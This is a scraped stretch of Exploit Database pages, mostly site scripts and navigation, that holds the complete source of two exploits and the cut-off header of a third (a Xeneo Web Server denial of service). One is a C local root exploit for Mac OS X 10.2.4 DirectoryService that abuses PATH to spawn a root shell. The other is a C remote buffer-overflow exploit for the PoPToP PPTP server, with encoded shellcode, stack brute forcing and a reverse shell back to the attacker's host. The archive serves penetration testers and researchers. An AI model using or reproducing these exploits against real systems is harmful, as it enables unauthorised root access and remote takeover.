else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 15
Apple Mac OSX 10.2.4 - DirectoryService 'PATH' Local Privilege Escalation - OSX local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDApple Mac OSX 10.2.4 - DirectoryService 'PATH' Local Privilege EscalationEDB-ID:15CVE:2003-0171EDB Verified:Author:Neeko OniType:localExploit:/Platform:OSXDate:2003-04-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*OS X <= 10.2.4 DirectoryService local root PATH exploitDirectoryService must be crashed prior to execution, per@stake advisory.  If you discover how to crash DirectoryServicee-mail me at neeko@haackey.com  [Neeko Oni]--Assuming DirectoryService has been crashed/killed, compilethis code as 'touch' (gcc osxds.c -o touch) and execute.bash$ ./touch*bunch of stuff here*euid is root.bash#*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <sys/types.h>intmain(int argc, char **argv){char           *ORIGPATH;int             temp;if (argc < 2) {if (geteuid() == 0) {printf("euid is root.\n");setuid(0);execl("/bin/bash", "bash", NULL);}strcpy(ORIGPATH, getenv("PATH"));printf("Original path: %s\n", ORIGPATH);setenv("PATH", ".", 1);printf("New path: %s\n", getenv("PATH"));printf("Executing DirectoryService with false PATH...\n");if (fork() == 0) {execl("/usr/sbin/DirectoryService", "DirectoryService", NULL);}printf("Forked DirectoryService, pausing before shell exec...\n");sleep(3);printf("Cross your fingers.\n");setenv("PATH", ORIGPATH, 1);printf("Path restored: %s\n", getenv("PATH"));execl("./touch", "touch", NULL);}system("/usr/sbin/chown root ./touch;/bin/chmod +s ./touch");}// milw0rm.com [2003-04-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 16
PoPToP PPTP 1.1.4-b3 - Remote Command Execution - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPoPToP PPTP 1.1.4-b3 - Remote Command ExecutionEDB-ID:16CVE:2003-0213EDB Verified:Author:einsteinType:remoteExploit:/Platform:LinuxDate:2003-04-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  exploit for a recently discovered vulnerability in PoPToP*  PPTP server under Linux. Versions affected are all prior to*  1.1.4-b3 and 1.1.3-20030409.*  The exploit is capable of bruteforcing the RET address to find our*  buffer in the stack. Upon a successfull run it brings up a reverse*  shell with privileges of the pptpd daemon (typically root)*  on the victim server.*/#include <iostream.h>#include <winsock.h>#include <stdio.h>#define u_int8_t char#define u_int16_t WORD#define u_int32_t DWORDchar shellcode[] ="\x1a\x76\xa2\x41\x21\xf5\x1a\x43\xa2\x5a\x1a\x58\xd0\x1a\xce\x6b""\xd0\x1a\xce\x67\xd8\x1a\xde\x6f\x1e\xde\x67\x5e\x13\xa2\x5a\x1a""\xd6\x67\xd0\xf5\x1a\xce\x7f\xf5\x54\xd6\x7d""\x01\x01" // port"\x54\xd6\x63""\x01\x01\x01\x01" // ip address"\x1e\xd6\x7f\x1a\xd6\x6b\x55\xd6\x6f\x83\x1a\x43\xd0\x1e\xde\x67""\x5e\x13\xa2\x5a\x03\x18\xce\x67\xa2\x53\xbe\x52\x6c\x6c\x6c\x5e""\x13\xd2\xa2\x41\x12\x79\x6e\x6c\x6c\x6c\xaa\x42\xe6\x79\x78\x8b""\xcd\x1a\xe6\x9b\xa2\x53\x1b\xd5\x94\x1a\xd6\x9f\x23\x98\x1a\x60""\x1e\xde\x9b\x1e\xc6\x9f\x5e\x13\x7b\x70\x6c\x6c\x6c\xbc\xf1\xfa""\xfd\xbc\xe0\xfb";struct pptp_header {u_int16_t length;               /* pptp message length incl header */u_int16_t pptp_type;            /* pptp message type */u_int32_t magic;                /* magic cookie */u_int16_t ctrl_type;            /* control message type */u_int16_t reserved0;            /* reserved */};#define MAX_HOSTNAME_SIZE               64#define MAX_VENDOR_SIZE                 64#define PPTP_VERSION                    0x0100struct pptp_start_ctrl_conn_rqst {struct pptp_header header;      /* pptp header */u_int16_t version;              /* pptp protocol version */u_int16_t reserved1;            /* reserved */u_int32_t framing_cap;          /* framing capabilities */u_int32_t bearer_cap;           /* bearer capabilities */u_int16_t max_channels;         /* maximum channels */u_int16_t firmware_rev;         /* firmware revision */u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */};struct pptp_echo_rqst {struct pptp_header header;      /* header */u_int32_t identifier;           /* value to match rply with rqst */char buf[10000];};struct pptp_reply {struct pptp_header header;      /* header */char buf[10000];};/* Magic Cookie */#define PPTP_MAGIC_COOKIE               0x1a2b3c4d/* Message types */#define PPTP_CTRL_MESSAGE               1/* Control Connection Management */#define START_CTRL_CONN_RQST            1#define START_CTRL_CONN_RPLY            2#define STOP_CTRL_CONN_RQST             3#define STOP_CTRL_CONN_RPLY             4#define ECHO_RQST                       5#define ECHO_RPLY                       6// brute force values#define TOPOFSTACK 0xbfffffff#define BOTTOMOFSTACK 0xbf000000#define STEP 50void send_init_request(SOCKET st){pptp_start_ctrl_conn_rqst request;request.header.magic = htonl(PPTP_MAGIC_COOKIE);request.header.pptp_type = htons(PPTP_CTRL_MESSAGE);request.header.ctrl_type = htons(START_CTRL_CONN_RQST);request.version = PPTP_VERSION;request.framing_cap = 0;request.bearer_cap = 0;request.max_channels = 1;request.firmware_rev = 0;strcpy(request.hostname,"hell");strcpy(request.vendor,"domain HELL");request.header.length = ntohs(sizeof(request));send(st,(char*)&request,sizeof(request),0);}void send_ping_overflow(SOCKET st,DWORD ret,char* hostname,short port){pptp_echo_rqst ping;ping.header.magic = htonl(PPTP_MAGIC_COOKIE);ping.header.pptp_type = htons(PPTP_CTRL_MESSAGE);ping.header.ctrl_type = htons(ECHO_RQST);ping.identifier = 111;ping.header.length = ntohs(1);strcpy(ping.buf,"");int buflen = 500;for (int i=0;i<buflen;i++)strcat(ping.buf,"\x90");memcpy(ping.buf+364,(char*)&ret,4);// patch shellcode// we have a shellcode xored by 0x93.. let's unxor it :)for (i=0;i<sizeof(shellcode);i++) shellcode[i] ^= 0x93;*(unsigned short int*)(shellcode+43) = htons(port);*(unsigned long int*)(shellcode+48) = inet_addr(hostname);// we leave 100 bytes for NOPsmemcpy(ping.buf+100,shellcode,sizeof(shellcode));send(st,(char*)&ping,sizeof(ping.header)+buflen,0);}SOCKET st;int connect_server(char* hostname){st=socket(PF_INET,SOCK_STREAM,0);if (st==INVALID_SOCKET) return 0;sockaddr_in addr;addr.sin_family=AF_INET;addr.sin_port=0;addr.sin_addr.s_addr=0;bind(st, (LPSOCKADDR)&addr,sizeof(addr));addr.sin_family=AF_INET;addr.sin_port=htons(1723);addr.sin_addr.s_addr=inet_addr(hostname);printf("connecting... ");if (connect(st,(sockaddr*)&addr,sizeof(addr)) != 0){printf("Connect error. GetLastError=%d\n",GetLastError());return 0;}return 1;}int main(int argc, char** argv){printf("\n");printf("                   D  H     H                            \n");printf("                   D  H     H     T\n");printf("                   D  H  H  H     T     EE    AA   M   M \n");printf("               DDD D  HHHHHHH     T    E  E  A  A  MM MM \n");printf("              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \n");printf("             D     D  H     H     T    EEE   AAAA  M M M \n");printf("              D    D  H     H     T    E     A  A  M   M \n");printf("               DDDD   H     H      TTT  EEE  A  A  M   M   ");printf(" ... presents ... \n\n");printf("Exploit for PoPToP PPTP server older than \n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");printf("by .einstein., April 2003.\n");printf("\n");if (argc < 2){printf("usage: \n");printf("  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\n\n",argv[0]);printf("    <pptp_server> is the ip address or hostname of the PoPToP server\n");printf("      you want to attack.  Port 1723 is used for connection\n");printf("    <your_ip> and <your_port> - specify an ip address to which\n");printf("      a connection is possible to port <your_port> and set up a\n");printf("      netcat listener. You'll get a reverse shell.\n");printf("    <timeout> is a delay between stack bruteforce attemts, in milliseconds\n");printf("   If you only pass a single parameter, the program will check\n");printf("   whether remote server is vulnerable or not. Otherwise it will\n");printf("   perform a ret bruteforce.\n");printf("usage examples:\n");printf("  %s 192.168.1.2 192.168.1.1 5555\n",argv[0]);printf("    attack 192.168.1.2 and get a reverse shell on port 5555\n");printf("  %s 127.0.0.1 127.0.0.1 6666 100\n",argv[0]);printf("    attack a locally running pptpd with a timeout of 100 ms\n");printf("    and get a shell on port 6666.\n");printf("  %s 192.168.1.56\n",argv[0]);printf("    check if the PoPToP server on 192.168.1.56 is vulnerable.\n");return 0;}int timeout = 500;if (argc >= 5) timeout = atoi(argv[4]);// init winsockWORD version=0x0101;WSADATA data;WSAStartup(version,&data);DWORD ret;if (argc == 2){if (!connect_server(argv[1])) return 1;printf("\nChecking if the server is vulnerable..\n");printf("(if it is you have to wait 65 seconds)..\n");send_init_request(st);ret = 0x01010101;int bytes;pptp_reply reply;//header lengthbytes = recv(st,(char*)&reply,2,0);bytes = ntohs(reply.header.length);bytes = recv(st,(char*)&reply+2,bytes-2,0);int j = htons(reply.header.ctrl_type);send_ping_overflow(st,ret,"0.0.0.0",0);//header lengthbytes = recv(st,(char*)&reply,2,0);printf("PoPToP server is ");if (bytes != SOCKET_ERROR) printf("vulnerable!\n");else printf("not vulnerable\n");closesocket(st);return 1;}printf("[!] Attempting bruteforce against %s\n",argv[1]);printf("interrupt when you get a shell to %s on port %d...\n\n",argv[2],atoi(argv[3]));int checked = 0;for (ret = TOPOFSTACK; ret >=BOTTOMOFSTACK; ret -= STEP){printf("[*] ");if (!connect_server(argv[1])) return 1;printf("[ret=0x%x]..",ret);printf("sending payload..");// initial packetsend_init_request(st);//a real overflowing ping packetsend_ping_overflow(st,ret,argv[2],atoi(argv[3]));closesocket(st);Sleep(timeout);printf("done\n");}return 0;}// milw0rm.com [2003-04-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 17
Xeneo Web Server 2.2.9.0 - Denial of Service - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDXeneo Web Server 2.2.9.0 - Denial of ServiceEDB-ID:17CVE:EDB Verified:Author:Tom 